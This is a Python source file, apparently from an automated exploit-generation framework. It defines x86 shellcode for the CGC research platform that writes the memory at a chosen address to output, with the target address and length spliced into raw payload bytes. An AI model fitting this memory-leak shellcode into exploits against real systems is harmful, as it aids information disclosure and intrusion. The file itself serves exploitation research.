import claripy
import logging
from rex.exploit.shellcode import Shellcode

l = logging.getLogger("rex.exploit.shellcodes.cgc_x86_setregister")

class X86LeakAddress(Shellcode):

    supported_platforms = ["cgc"]

    arch = "X86"

    name = "leakaddress"

    code = ["\x31\xc0\x40\x40\x31\xdb\x43\xb9", "\xba", "\x31\xf6\xcd\x80"]

    def to_raw(self, address, length):
        #pylint:disable=arguments-differ
        '''
        :param addr: address to leak
        :param length: amount of bytes to write from leak
        '''

        if isinstance(address, (int, long)):
            address = claripy.BVV(address, 32)
        if isinstance(length, (int, long)):
            length = claripy.BVV(length, 32)

        bv_codes = map(claripy.BVV, self.code)

        return claripy.Concat(bv_codes[0], address.reversed, bv_codes[1], length.reversed, bv_codes[2])
